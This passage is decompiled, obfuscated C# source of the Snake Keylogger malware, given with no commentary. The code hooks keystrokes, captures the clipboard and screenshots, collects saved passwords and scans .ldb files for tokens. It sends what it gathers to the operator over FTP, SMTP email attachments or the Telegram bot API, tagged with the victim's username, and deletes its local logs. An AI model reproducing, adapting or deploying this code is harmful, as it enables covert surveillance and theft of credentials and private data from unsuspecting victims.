          byte[] bytes = Encoding.UTF8.GetBytes("Clipboard | " + Environment.UserName + " | Snake\r\n" + ջô\uFFFDܣƚ.\u07B4\uFFFDʓK늻 + "\r\n\r\n\r\n" + ջô\uFFFDܣƚ.Α\u0385Ω\uFFFDΠ + "\r\n\r\n--------------------------------------------------");
          ftpWebRequest.ContentLength = (long) bytes.Length;
          using (Stream requestStream = ftpWebRequest.GetRequestStream())
          {
            requestStream.Write(bytes, 0, bytes.Length);
            requestStream.Close();
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          return;
        }
      }
      if (Operators.CompareString(ջô\uFFFDܣƚ.ϱӓ뫆اչ, "$%SMTPDV$", false) == 0)
      {
        try
        {
          MailMessage message = new MailMessage();
          message.From = new MailAddress(ջô\uFFFDܣƚ.\uDAE4\uDED3\u07B8\uFFFD\uFFFD);
          message.To.Add(ջô\uFFFDܣƚ.\u061D\uFFFD\u0089븤ε);
          message.Subject = " Pc Name: " + Environment.UserName + " | Snake Keylogger";
          message.Body = "Clipboard | " + Environment.UserName + " | Snake\r\n" + ջô\uFFFDܣƚ.\u07B4\uFFFDʓK늻 + "\r\n\r\n";
          MemoryStream contentStream = new MemoryStream(ջô\uFFFDܣƚ.ӥҡۚή\uFFFD());
          message.Attachments.Add(new Attachment((Stream) contentStream, "Clipboard" + ջô\uFFFDܣƚ.\u1CFCœݝִױ, "text/plain"));
          new SmtpClient(ջô\uFFFDܣƚ.W\u2964\uFFFD̲؜)
          {
            EnableSsl = (Operators.CompareString(ջô\uFFFDܣƚ.کεҚ蠺Ц, "True", false) == 0),
            Port = Conversions.ToInteger(ջô\uFFFDܣƚ.ζڿŚŎ\uFFFD),
            Credentials = ((ICredentialsByHost) new NetworkCredential(ջô\uFFFDܣƚ.\uDAE4\uDED3\u07B8\uFFFD\uFFFD, ջô\uFFFDܣƚ.\u061DƉŲ\uFFFDꓞ))
          }.Send(message);
          message.Dispose();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(ջô\uFFFDܣƚ.ϱӓ뫆اչ, "$%TelegramDv$", false) == 0)
      {
        try
        {
          string str1 = "Clipboard | " + Environment.UserName + " | Snake\r\n" + ջô\uFFFDܣƚ.\u07B4\uFFFDʓK늻 + "\r\n\r\n\r\n" + ջô\uFFFDܣƚ.Α\u0385Ω\uFFFDΠ + "\r\n\r\n--------------------------------------------------";
          ServicePointManager.Expect100Continue = false;
          ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
          string str2 = "https://api.telegram.org/bot" + ջô\uFFFDܣƚ.\uFFFDşӤ2ٵ + "/sendDocument?chat_id=" + ջô\uFFFDܣƚ.Ŕޤ\u26CA\u05C3հ + "&caption=" + (" Pc Name: " + Environment.UserName + " | Snake Keylogger\r\n\r\nClipboard | " + Environment.UserName + " | Snake\r\n\r\n\r\n");
          ջô\uFFFDܣƚ.\u05C1ϒ2\u060C\uFFFD("Clipboard" + ջô\uFFFDܣƚ.\u1CFCœݝִױ, "application/x-ms-dos-executable", str2, str1);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
    }

    public static void C\uFFFD\uFFFDױ\uFFFD(object _param0, EventArgs _param1)
    {
      string str1 = "Screenshot";
      string str2 = ".png";
      string path = 恁\uFFFD\uFFFDAô.㠰\uFFFD\uFFFD\uFFFD\uFFFD.FileSystem.SpecialDirectories.MyDocuments + "\\SnakeKeylogger";
      try
      {
        if (Directory.Exists(path))
        {
          ջô\uFFFDܣƚ.皍̱\u0097̳ʤ = 恁\uFFFD\uFFFDAô.㠰\uFFFD\uFFFD\uFFFD\uFFFD.FileSystem.SpecialDirectories.MyDocuments + "\\SnakeKeylogger\\" + str1 + str2;
          int width = 恁\uFFFD\uFFFDAô.㠰\uFFFD\uFFFD\uFFFD\uFFFD.Screen.Bounds.Width;
          Rectangle bounds = 恁\uFFFD\uFFFDAô.㠰\uFFFD\uFFFD\uFFFD\uFFFD.Screen.Bounds;
          int height = bounds.Height;
          Size blockRegionSize = new Size(width, height);
          bounds = 恁\uFFFD\uFFFDAô.㠰\uFFFD\uFFFD\uFFFD\uFFFD.Screen.Bounds;
          Bitmap bitmap = new Bitmap(bounds.Width, 恁\uFFFD\uFFFDAô.㠰\uFFFD\uFFFD\uFFFD\uFFFD.Screen.Bounds.Height);
          Graphics.FromImage((Image) bitmap).CopyFromScreen(new Point(0, 0), new Point(0, 0), blockRegionSize);
          bitmap.Save(ջô\uFFFDܣƚ.皍̱\u0097̳ʤ);
          ջô\uFFFDܣƚ.éʭӺջ\uFFFD();
          ջô\uFFFDܣƚ.\uFFFD皍ܣ丐\uFFFD();
        }
        else
        {
          Directory.CreateDirectory(path);
          Size blockRegionSize = new Size(恁\uFFFD\uFFFDAô.㠰\uFFFD\uFFFD\uFFFD\uFFFD.Screen.Bounds.Width, 恁\uFFFD\uFFFDAô.㠰\uFFFD\uFFFD\uFFFD\uFFFD.Screen.Bounds.Height);
          Bitmap bitmap = new Bitmap(恁\uFFFD\uFFFDAô.㠰\uFFFD\uFFFD\uFFFD\uFFFD.Screen.Bounds.Width, 恁\uFFFD\uFFFDAô.㠰\uFFFD\uFFFD\uFFFD\uFFFD.Screen.Bounds.Height);
          Graphics.FromImage((Image) bitmap).CopyFromScreen(new Point(0, 0), new Point(0, 0), blockRegionSize);
          bitmap.Save(ջô\uFFFDܣƚ.皍̱\u0097̳ʤ);
          ջô\uFFFDܣƚ.éʭӺջ\uFFFD();
          ջô\uFFFDܣƚ.\uFFFD皍ܣ丐\uFFFD();
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void éʭӺջ\uFFFD()
    {
      if (Operators.CompareString(ջô\uFFFDܣƚ.ϱӓ뫆اչ, "%FTPDV$", false) == 0)
      {
        FtpWebRequest ftpWebRequest = (FtpWebRequest) NewLateBinding.LateGet((object) null, typeof (WebRequest), "Create", new object[1]
        {
          Operators.AddObject(Operators.AddObject((object) (ջô\uFFFDܣƚ.ҭAױå\uFFFD + 恁\uFFFD\uFFFDAô.㠰\uFFFD\uFFFD\uFFFD\uFFFD.Name + " - Screenshot Logs ID - "), ջô\uFFFDܣƚ.䇹Ɖôأʓ), (object) ".png")
        }, (string[]) null, (System.Type[]) null, (bool[]) null);
        try
        {
          ftpWebRequest.Method = "STOR";
          ftpWebRequest.Credentials = (ICredentials) new NetworkCredential(ջô\uFFFDܣƚ.丐\uFFFD\u061D\uFFFD鈟, ջô\uFFFDܣƚ.ҡ\uFFFDҏۨɇ);
          byte[] buffer = System.IO.File.ReadAllBytes(ջô\uFFFDܣƚ.皍̱\u0097̳ʤ);
          ftpWebRequest.ContentLength = (long) buffer.Length;
          using (Stream requestStream = ftpWebRequest.GetRequestStream())
          {
            requestStream.Write(buffer, 0, buffer.Length);
            requestStream.Close();
            System.IO.File.Delete(ջô\uFFFDܣƚ.皍̱\u0097̳ʤ);
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          return;
        }
      }
      if (Operators.CompareString(ջô\uFFFDܣƚ.ϱӓ뫆اչ, "$%SMTPDV$", false) == 0)
      {
        try
        {
          MailMessage message = new MailMessage();
          message.From = new MailAddress(ջô\uFFFDܣƚ.\uDAE4\uDED3\u07B8\uFFFD\uFFFD);
          message.To.Add(ջô\uFFFDܣƚ.\u061D\uFFFD\u0089븤ε);
          message.Subject = " Pc Name: " + Environment.UserName + " | Snake Keylogger";
          message.Body = "Screenshot | " + Environment.UserName + " | Snake\r\n" + ջô\uFFFDܣƚ.\u07B4\uFFFDʓK늻 + "\r\n\r\n";
          Attachment attachment = new Attachment(ջô\uFFFDܣƚ.皍̱\u0097̳ʤ);
          message.Attachments.Add(attachment);
          new SmtpClient(ջô\uFFFDܣƚ.W\u2964\uFFFD̲؜)
          {
            EnableSsl = (Operators.CompareString(ջô\uFFFDܣƚ.کεҚ蠺Ц, "True", false) == 0),
            Port = Conversions.ToInteger(ջô\uFFFDܣƚ.ζڿŚŎ\uFFFD),
            Credentials = ((ICredentialsByHost) new NetworkCredential(ջô\uFFFDܣƚ.\uDAE4\uDED3\u07B8\uFFFD\uFFFD, ջô\uFFFDܣƚ.\u061DƉŲ\uFFFDꓞ))
          }.Send(message);
          message.Dispose();
          ջô\uFFFDܣƚ.\uFFFD皍ܣ丐\uFFFD();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(ջô\uFFFDܣƚ.ϱӓ뫆اչ, "$%TelegramDv$", false) == 0)
      {
        try
        {
          byte[] numArray = System.IO.File.ReadAllBytes(ջô\uFFFDܣƚ.皍̱\u0097̳ʤ);
          ServicePointManager.Expect100Continue = false;
          ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
          string str = "https://api.telegram.org/bot" + ջô\uFFFDܣƚ.\uFFFDşӤ2ٵ + "/sendDocument?chat_id=" + ջô\uFFFDܣƚ.Ŕޤ\u26CA\u05C3հ + "&caption=" + (" Pc Name: " + Environment.UserName + " | Snake Keylogger\r\n\r\nScreenshot | " + Environment.UserName + " | Snake\r\n" + ջô\uFFFDܣƚ.\u07B4\uFFFDʓK늻 + "\r\n\r\n");
          ջô\uFFFDܣƚ.\u060CޗأҚζ(numArray, ջô\uFFFDܣƚ.皍̱\u0097̳ʤ, "application/x-ms-dos-executable", str);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
    }

    public static void \uFFFD皍ܣ丐\uFFFD()
    {
      int num1;
      int num2;
      try
      {
label_2:
        int num3 = 1;
        string path = 恁\uFFFD\uFFFDAô.㠰\uFFFD\uFFFD\uFFFD\uFFFD.FileSystem.SpecialDirectories.MyDocuments + "\\SnakeKeylogger";
label_3:
        ProjectData.ClearProjectError();
        num1 = -2;
label_4:
        num3 = 3;
        if (!Directory.Exists(path))
          goto label_7;
label_5:
        num3 = 4;
        Directory.Delete(path, true);
label_6:
label_7:
        goto label_14;
label_9:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_2;
              case 2:
                goto label_3;
              case 3:
                goto label_4;
              case 4:
                goto label_5;
              case 5:
                goto label_6;
              case 6:
                goto label_14;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_9;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_14:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    public static byte[] ל̀\uFFFDި\uFFFD() => Encoding.Unicode.GetBytes("KP | " + Environment.UserName + " | Snake\r\n" + ջô\uFFFDܣƚ.\u07B4\uFFFDʓK늻 + "\r\n\r\n\r\n" + ջô\uFFFDܣƚ.Ц\u061D쐬鈟ֵ.ToString() + "\r\n\r\n\r\n--------------------------------------------------");

    private static void \uFFFD쐬퓜\uFFFD\uFFFD(object _param0, EventArgs œ똛ױ̳ջ)
    {
      if (Operators.CompareString(ջô\uFFFDܣƚ.ϱӓ뫆اչ, "%FTPDV$", false) == 0)
      {
        FtpWebRequest ftpWebRequest = (FtpWebRequest) NewLateBinding.LateGet((object) null, typeof (WebRequest), "Create", new object[1]
        {
          Operators.AddObject(Operators.AddObject((object) (ջô\uFFFDܣƚ.ҭAױå\uFFFD + 恁\uFFFD\uFFFDAô.㠰\uFFFD\uFFFD\uFFFD\uFFFD.Name + " - keystroke Logs ID - "), ջô\uFFFDܣƚ.䇹Ɖôأʓ), (object) ջô\uFFFDܣƚ.\u1CFCœݝִױ)
        }, (string[]) null, (System.Type[]) null, (bool[]) null);
        try
        {
          ftpWebRequest.Method = "STOR";
          ftpWebRequest.Credentials = (ICredentials) new NetworkCredential(ջô\uFFFDܣƚ.丐\uFFFD\u061D\uFFFD鈟, ջô\uFFFDܣƚ.ҡ\uFFFDҏۨɇ);
          byte[] bytes = Encoding.UTF8.GetBytes("KP | " + Environment.UserName + " | Snake\r\n" + ջô\uFFFDܣƚ.\u07B4\uFFFDʓK늻 + "\r\n\r\n\r\n" + ջô\uFFFDܣƚ.Ц\u061D쐬鈟ֵ.ToString() + "\r\n\r\n\r\n--------------------------------------------------");
          ftpWebRequest.ContentLength = (long) bytes.Length;
          using (Stream requestStream = ftpWebRequest.GetRequestStream())
          {
            requestStream.Write(bytes, 0, bytes.Length);
            requestStream.Close();
            ջô\uFFFDܣƚ.\u07B4أ\uFFFD꼺\uFFFD = "";
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          return;
        }
      }
      if (Operators.CompareString(ջô\uFFFDܣƚ.ϱӓ뫆اչ, "$%SMTPDV$", false) == 0)
      {
        try
        {
          MailMessage message = new MailMessage();
          message.From = new MailAddress(ջô\uFFFDܣƚ.\uDAE4\uDED3\u07B8\uFFFD\uFFFD);
          message.To.Add(ջô\uFFFDܣƚ.\u061D\uFFFD\u0089븤ε);
          message.Subject = " Pc Name: " + Environment.UserName + " | Snake Keylogger";
          MemoryStream contentStream = new MemoryStream(ջô\uFFFDܣƚ.ל̀\uFFFDި\uFFFD());
          message.Attachments.Add(new Attachment((Stream) contentStream, "Keystrokes" + ջô\uFFFDܣƚ.\u1CFCœݝִױ, "text/plain"));
          message.Body = "KP | " + Environment.UserName + " | Snake\r\n\r\n\r\n";
          new SmtpClient(ջô\uFFFDܣƚ.W\u2964\uFFFD̲؜)
          {
            EnableSsl = (Operators.CompareString(ջô\uFFFDܣƚ.کεҚ蠺Ц, "True", false) == 0),
            Port = Conversions.ToInteger(ջô\uFFFDܣƚ.ζڿŚŎ\uFFFD),
            Credentials = ((ICredentialsByHost) new NetworkCredential(ջô\uFFFDܣƚ.\uDAE4\uDED3\u07B8\uFFFD\uFFFD, ջô\uFFFDܣƚ.\u061DƉŲ\uFFFDꓞ))
          }.Send(message);
          message.Dispose();
          ջô\uFFFDܣƚ.\u07B4أ\uFFFD꼺\uFFFD = "";
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(ջô\uFFFDܣƚ.ϱӓ뫆اչ, "$%TelegramDv$", false) == 0)
      {
        try
        {
          string str1 = "Keylogger | " + Environment.UserName + " | Snake\r\n" + ջô\uFFFDܣƚ.\u07B4\uFFFDʓK늻 + "\r\n\r\n\r\n" + ջô\uFFFDܣƚ.Ц\u061D쐬鈟ֵ.ToString() + "\r\n\r\n\r\n--------------------------------------------------";
          ServicePointManager.Expect100Continue = false;
          ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
          string str2 = "https://api.telegram.org/bot" + ջô\uFFFDܣƚ.\uFFFDşӤ2ٵ + "/sendDocument?chat_id=" + ջô\uFFFDܣƚ.Ŕޤ\u26CA\u05C3հ + "&caption=" + (" Pc Name: " + Environment.UserName + " | Snake Keylogger\r\n\r\nKeylogger | " + Environment.UserName + " | Snake\r\n\r\n\r\n");
          ջô\uFFFDܣƚ.\u05C1ϒ2\u060C\uFFFD("SnakeKeylogger" + ջô\uFFFDܣƚ.\u1CFCœݝִױ, "application/x-ms-dos-executable", str2, str1);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
    }

    private static void сɮJ\uFFFDR(object _param0, ջô\uFFFDܣƚ.KeyLoggerEventArgs _param1)
    {
      if (Operators.CompareString(ջô\uFFFDܣƚ.å\uFFFD̲מ\u0026, ջô\uFFFDܣƚ.ǎ\uFFFD\uFFFDã\uFFFD.CurrentWindow, false) != 0)
      {
        ջô\uFFFDܣƚ.å\uFFFD̲מ\u0026 = ջô\uFFFDܣƚ.ǎ\uFFFD\uFFFDã\uFFFD.CurrentWindow;
        ջô\uFFFDܣƚ.\u2964\u058F\u07B9\uFFFDÒ(string.Format("\r\n[ -- {0} -- ]\r\n", (object) ջô\uFFFDܣƚ.ǎ\uFFFD\uFFFDã\uFFFD.CurrentWindow));
      }
      ջô\uFFFDܣƚ.\u2964\u058F\u07B9\uFFFDÒ(string.Format("{0}", (object) _param1.StringValue));
    }

    private static void \u05C9Jņ\uFFFD\uFFFD(object _param0, ջô\uFFFDܣƚ.KeyLoggerEventArgs _param1) => ջô\uFFFDܣƚ.\u2964\u058F\u07B9\uFFFDÒ(string.Format("{0}", (object) _param1.StringValue));

    private static void \u2964\u058F\u07B9\uFFFDÒ(string 꼺ãֵﾭՕ) => ջô\uFFFDܣƚ.Ц\u061D쐬鈟ֵ.Append(꼺ãֵﾭՕ);

    [DllImport("user32.dll", EntryPoint = "GetForegroundWindow")]
    public static extern IntPtr Īӓ\u07FBܣЮ();

    [DllImport("user32.dll", EntryPoint = "GetWindowText")]
    public static extern int 똛\uFFFDݝ鈇\u0089(IntPtr _param0, StringBuilder _param1, int _param2);

    [DllImport("ntdll.dll", EntryPoint = "Wekakekakd", SetLastError = true)]
    public static extern int מé؜\uFFFD\uFFFD(
      IntPtr _param0,
      int _param1,
      ref int _param2,
      int _param3);

    [DllImport("user32.dll", EntryPoint = "GetWindowThreadProcessId", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int ҏJήôÒ(IntPtr 퓜Π뜸ƌ̳, ref int ҭڿמŎʓ);

    [DllImport("user32", EntryPoint = "GetKeyboardLayout", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int Śt\uFFFD恁\uFFFD(int _param0);

    [DllImport("user32.dll", EntryPoint = "ToUnicodeEx")]
    public static extern int \uFFFD\uFFFD\uFFFDj㠰(
      uint _param0,
      uint _param1,
      byte[] ݝՄÒ퓜ʓ,
      [MarshalAs(UnmanagedType.LPWStr), Out] StringBuilder _param3,
      int _param4,
      uint _param5,
      IntPtr _param6);

    [DllImport("user32.dll", EntryPoint = "GetKeyboardState")]
    public static extern bool 늻ܣٗW2(byte[] ųş̱ٚӓ);

    [DllImport("user32.dll", EntryPoint = "MapVirtualKey")]
    public static extern uint ی\u060Cɛɢˤ(uint _param0, uint _param1);

    private static void \u05B4J泮㹃ٷ()
    {
      ThreadStart start;
      // ISSUE: reference to a compiler-generated field
      if (ջô\uFFFDܣƚ._Closure\u0024__.\u0024I106\u002D0 != null)
      {
        // ISSUE: reference to a compiler-generated field
        start = ջô\uFFFDܣƚ._Closure\u0024__.\u0024I106\u002D0;
      }
      else
      {
        // ISSUE: reference to a compiler-generated field
        ջô\uFFFDܣƚ._Closure\u0024__.\u0024I106\u002D0 = start = (ThreadStart) (() =>
        {
          ջô\uFFFDܣƚ.ǎ\uFFFD\uFFFDã\uFFFD = new ջô\uFFFDܣƚ.KeyLogger();
          ջô\uFFFDܣƚ.ǎ\uFFFD\uFFFDã\uFFFD.KeyDown += new ջô\uFFFDܣƚ.KeyLoggerEventArgsEventHandler(ջô\uFFFDܣƚ.сɮJ\uFFFDR);
          ջô\uFFFDܣƚ.ǎ\uFFFD\uFFFDã\uFFFD.KeyUp += new ջô\uFFFDܣƚ.KeyLoggerEventArgsEventHandler(ջô\uFFFDܣƚ.\u05C9Jņ\uFFFD\uFFFD);
          Application.Run();
        });
      }
      new Thread(start).Start();
    }

    public static byte[] 鈇ЮΑWЮ() => Encoding.Unicode.GetBytes(ջô\uFFFDܣƚ.\u0306\u005E\uFFFDΑ蠺("PW | " + Environment.UserName + " | Snake\r\n" + ջô\uFFFDܣƚ.\u07B4\uFFFDʓK늻 + "\r\n" + ջô\uFFFDܣƚ.뜸Ò\uFFFD\uFFFDŧ + "\r\n\r\n\r\n\r\n\r\n--------------------------------------------------", ջô\uFFFDܣƚ.ɇհִӓב));

    public static byte[] 䕃ܣ\u2964\uFFFDҏ() => Encoding.Default.GetBytes(ջô\uFFFDܣƚ.\u0306\u005E\uFFFDΑ蠺("PW | " + Environment.UserName + " | Snake\r\n" + ջô\uFFFDܣƚ.\u07B4\uFFFDʓK늻 + "\r\n" + ջô\uFFFDܣƚ.뜸Ò\uFFFD\uFFFDŧ + "\r\n\r\n\r\n\r\n\r\n--------------------------------------------------", ջô\uFFFDܣƚ.ɇհִӓב));

    private static void ēƉ\u26CAٚë(object _param0, EventArgs Қ嵱ҭϱִ)
    {
      if (Operators.CompareString(ջô\uFFFDܣƚ.ϱӓ뫆اչ, "%FTPDV$", false) == 0)
      {
        FtpWebRequest ftpWebRequest = (FtpWebRequest) NewLateBinding.LateGet((object) null, typeof (WebRequest), "Create", new object[1]
        {
          Operators.AddObject(Operators.AddObject((object) (ջô\uFFFDܣƚ.ҭAױå\uFFFD + 恁\uFFFD\uFFFDAô.㠰\uFFFD\uFFFD\uFFFD\uFFFD.Name + " - Passwords ID - "), ջô\uFFFDܣƚ.䇹Ɖôأʓ), (object) ջô\uFFFDܣƚ.\u1CFCœݝִױ)
        }, (string[]) null, (System.Type[]) null, (bool[]) null);
        try
        {
          ftpWebRequest.Method = "STOR";
          ftpWebRequest.Credentials = (ICredentials) new NetworkCredential(ջô\uFFFDܣƚ.丐\uFFFD\u061D\uFFFD鈟, ջô\uFFFDܣƚ.ҡ\uFFFDҏۨɇ);
          byte[] bytes = Encoding.UTF8.GetBytes(ջô\uFFFDܣƚ.\u0306\u005E\uFFFDΑ蠺("PW | " + Environment.UserName + " | Snake\r\n" + ջô\uFFFDܣƚ.\u07B4\uFFFDʓK늻 + "\r\n" + ջô\uFFFDܣƚ.뜸Ò\uFFFD\uFFFDŧ + "\r\n\r\n\r\n\r\n\r\n--------------------------------------------------", ջô\uFFFDܣƚ.ɇհִӓב));
          ftpWebRequest.ContentLength = (long) bytes.Length;
          using (Stream requestStream = ftpWebRequest.GetRequestStream())
          {
            requestStream.Write(bytes, 0, bytes.Length);
            requestStream.Close();
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          return;
        }
      }
      if (Operators.CompareString(ջô\uFFFDܣƚ.ϱӓ뫆اչ, "$%SMTPDV$", false) == 0)
      {
        try
        {
          MailMessage message = new MailMessage();
          message.From = new MailAddress(ջô\uFFFDܣƚ.\uDAE4\uDED3\u07B8\uFFFD\uFFFD);
          message.To.Add(ջô\uFFFDܣƚ.\u061D\uFFFD\u0089븤ε);
          message.Subject = " Pc Name: " + Environment.UserName + " | Snake Keylogger";
          message.Body = "PW | " + Environment.UserName + " | Snake\r\n\r\n\r\n";
          byte[] buffer1 = ջô\uFFFDܣƚ.鈇ЮΑWЮ();
          byte[] buffer2 = ջô\uFFFDܣƚ.䕃ܣ\u2964\uFFFDҏ();
          MemoryStream contentStream1 = new MemoryStream(buffer1);
          MemoryStream contentStream2 = new MemoryStream(buffer2);
          message.Attachments.Add(new Attachment((Stream) contentStream1, "Passwords" + ջô\uFFFDܣƚ.\u1CFCœݝִױ, "text/plain"));
          message.Attachments.Add(new Attachment((Stream) contentStream2, "User" + ջô\uFFFDܣƚ.\u1CFCœݝִױ, "text/plain"));
          new SmtpClient(ջô\uFFFDܣƚ.W\u2964\uFFFD̲؜)
          {
            EnableSsl = (Operators.CompareString(ջô\uFFFDܣƚ.کεҚ蠺Ц, "True", false) == 0),
            Port = Conversions.ToInteger(ջô\uFFFDܣƚ.ζڿŚŎ\uFFFD),
            Credentials = ((ICredentialsByHost) new NetworkCredential(ջô\uFFFDܣƚ.\uDAE4\uDED3\u07B8\uFFFD\uFFFD, ջô\uFFFDܣƚ.\u061DƉŲ\uFFFDꓞ))
          }.Send(message);
          message.Dispose();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(ջô\uFFFDܣƚ.ϱӓ뫆اչ, "$%TelegramDv$", false) == 0)
      {
        try
        {
          string str1 = ջô\uFFFDܣƚ.\u0306\u005E\uFFFDΑ蠺("PW | " + Environment.UserName + " | Snake\r\n" + ջô\uFFFDܣƚ.\u07B4\uFFFDʓK늻 + "\r\n" + ջô\uFFFDܣƚ.뜸Ò\uFFFD\uFFFDŧ + "\r\n\r\n\r\n\r\n\r\n--------------------------------------------------", ջô\uFFFDܣƚ.ɇհִӓב);
          ServicePointManager.Expect100Continue = false;
          ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
          string str2 = "https://api.telegram.org/bot" + ջô\uFFFDܣƚ.\uFFFDşӤ2ٵ + "/sendDocument?chat_id=" + ջô\uFFFDܣƚ.Ŕޤ\u26CA\u05C3հ + "&caption=" + (" Pc Name: " + Environment.UserName + " | Snake Keylogger\r\n\r\nPW | " + Environment.UserName + " | Snake\r\n\r\n\r\n");
          ջô\uFFFDܣƚ.i\u02E8R鈟\uFFFD("SnakePW" + ջô\uFFFDܣƚ.\u1CFCœݝִױ, "application/x-ms-dos-executable", str2, str1);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
    }

    private static bool Ц\uFFFD丐ױŔ(ref string _param0)
    {
      bool flag;
      if (Directory.Exists(_param0))
      {
        FileInfo[] files = new DirectoryInfo(_param0).GetFiles();
        int index = 0;
        while (index < files.Length)
        {
          FileInfo fileInfo = files[index];
          if (fileInfo.Name.EndsWith(".ldb") && System.IO.File.ReadAllText(fileInfo.FullName).Contains("oken"))
          {
            _param0 += fileInfo.Name;
            return _param0.EndsWith(".ldb");
          }
          checked { ++index; }
        }
        flag = _param0.EndsWith(".ldb");
      }
      else
        flag = false;
      return flag;
    }

    private static string å\uFFFD\uFFFD盀Ц(string _param0)
    {
      string[] collection = _param0.Substring(checked (_param0.IndexOf("oken") + 4)).Split('"');
      List<string> stringList = new List<string>();
      stringList.AddRange((IEnumerable<string>) collection);
      stringList.RemoveAt(0);
      return string.Join("\"", stringList.ToArray());
    }

    private static string ǎ\uFFFDٵ\uFFFDٗ(string _param0, bool _param1 = false)
    {
      string str1 = Encoding.UTF8.GetString(System.IO.File.ReadAllBytes(_param0));
      string str2 = "";
      string str3 = str1;
      while (str3.Contains("oken"))
      {
        string[] strArray = ջô\uFFFDܣƚ.å\uFFFD\uFFFD盀Ц(str3).Split('"');
        str2 = strArray[0];
        str3 = string.Join("\"", strArray);
        if (_param1 && str2.Length == 59)
          break;
      }
      return str2;
    }

    public static void K븤Πިۨ()
    {
      if (Operators.CompareString(ջô\uFFFDܣƚ.ϱӓ뫆اչ, "%FTPDV$", false) == 0)
      {
        FtpWebRequest ftpWebRequest = (FtpWebRequest) NewLateBinding.LateGet((object) null, typeof (WebRequest), "Create", new object[1]
        {
          Operators.AddObject(Operators.AddObject((object) (ջô\uFFFDܣƚ.ҭAױå\uFFFD + 恁\uFFFD\uFFFDAô.㠰\uFFFD\uFFFD\uFFFD\uFFFD.Name + " - Passwords ID - "), ջô\uFFFDܣƚ.䇹Ɖôأʓ), (object) ջô\uFFFDܣƚ.\u1CFCœݝִױ)
        }, (string[]) null, (System.Type[]) null, (bool[]) null);
        try
        {
          ftpWebRequest.Method = "STOR";
          ftpWebRequest.Credentials = (ICredentials) new NetworkCredential(ջô\uFFFDܣƚ.丐\uFFFD\u061D\uFFFD鈟, ջô\uFFFDܣƚ.ҡ\uFFFDҏۨɇ);
          byte[] bytes = Encoding.UTF8.GetBytes(ջô\uFFFDܣƚ.\u0306\u005E\uFFFDΑ蠺("PW | " + Environment.UserName + " | Snake\r\n" + ջô\uFFFDܣƚ.\u07B4\uFFFDʓK늻 + "\r\n" + ջô\uFFFDܣƚ.뜸Ò\uFFFD\uFFFDŧ + "\r\n\r\n\r\n\r\n\r\n--------------------------------------------------", ջô\uFFFDܣƚ.ɇհִӓב));
          ftpWebRequest.ContentLength = (long) bytes.Length;
          using (Stream requestStream = ftpWebRequest.GetRequestStream())
          {
            requestStream.Write(bytes, 0, bytes.Length);
            requestStream.Close();
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          return;
        }
      }
      if (Operators.CompareString(ջô\uFFFDܣƚ.ϱӓ뫆اչ, "$%SMTPDV$", false) == 0)
      {
        try
        {
          MailMessage message = new MailMessage();
          message.From = new MailAddress(ջô\uFFFDܣƚ.\uDAE4\uDED3\u07B8\uFFFD\uFFFD);
          message.To.Add(ջô\uFFFDܣƚ.\u061D\uFFFD\u0089븤ε);
          message.Subject = " Pc Name: " + Environment.UserName + " | Snake Keylogger";
          message.Body = "PW | " + Environment.UserName + " | Snake\r\n\r\n\r\n";
          byte[] buffer1 = ջô\uFFFDܣƚ.鈇ЮΑWЮ();
          byte[] buffer2 = ջô\uFFFDܣƚ.䕃ܣ\u2964\uFFFDҏ();
          MemoryStream contentStream1 = new MemoryStream(buffer1);
          MemoryStream contentStream2 = new MemoryStream(buffer2);
          message.Attachments.Add(new Attachment((Stream) contentStream1, "Passwords" + ջô\uFFFDܣƚ.\u1CFCœݝִױ, "text/plain"));
          message.Attachments.Add(new Attachment((Stream) contentStream2, "User" + ջô\uFFFDܣƚ.\u1CFCœݝִױ, "text/plain"));
          new SmtpClient(ջô\uFFFDܣƚ.W\u2964\uFFFD̲؜)
          {
            EnableSsl = (Operators.CompareString(ջô\uFFFDܣƚ.کεҚ蠺Ц, "True", false) == 0),
            Port = Conversions.ToInteger(ջô\uFFFDܣƚ.ζڿŚŎ\uFFFD),
            Credentials = ((ICredentialsByHost) new NetworkCredential(ջô\uFFFDܣƚ.\uDAE4\uDED3\u07B8\uFFFD\uFFFD, ջô\uFFFDܣƚ.\u061DƉŲ\uFFFDꓞ))
          }.Send(message);
          message.Dispose();
        }
        catch (Exception ex)
        {
